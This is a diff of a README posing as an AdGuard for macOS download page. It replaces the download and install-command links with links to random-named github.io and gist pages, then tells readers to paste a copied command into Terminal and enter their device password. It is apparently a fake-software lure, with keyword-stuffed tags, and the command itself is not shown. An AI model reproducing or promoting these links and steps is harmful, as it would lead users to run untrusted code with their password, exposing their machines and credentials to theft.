@@ -3,7 +3,7 @@
 
 AdGuard is a powerful ad blocker and privacy protection tool for macOS. With this application, you can browse faster, block intrusive ads, and keep your data safe from trackers and phishing websites. 🍏  
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-007AFF?style=for-the-badge&logo=apple&logoColor=white)](https://juianaiud84.github.io/.github/adguard)  
+[![install for macOS](https://img.shields.io/badge/install%20for%20macOS-007AFF?style=for-the-badge&logo=apple&logoColor=white)](https://dinkkennyrice406.github.io/.github/adguard)  
 
 If the download button doesn't work, follow the installation instructions below using the Terminal command.
 
@@ -22,7 +22,7 @@ If the download button doesn't work, follow the installation instructions below 
 
 1. Click the button below to get the install command:  
    
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-34C759?style=for-the-badge&logo=apple&logoColor=white)](https://gistcdn.githack.com/mcnaryluckystrike-debug/944aadd6eaf7fe51e2c33a41bb1fc4a0/raw/7541d4ba466b685b1afb8476db65b18a25cfd4e4/install.html)
+[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-34C759?style=for-the-badge&logo=apple&logoColor=white)](https://dinkkennyrice406.github.io/.github/adguard)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -87,3 +87,4 @@ AdGuard’s intuitive interface makes it easy for users of all levels to configu
 ## 🔍 Tags
 
 AdGuard mac, AdGuard download, AdGuard for Mac download, AdGuard macOS installer, free AdGuard for Mac, AdGuard Mac ad blocker, AdGuard free, AdGuard macbook, AdGuard safari, AdGuard free download, AdGuard download free, download AdGuard, free AdGuard, download AdGuard for mac, AdGuard install
+
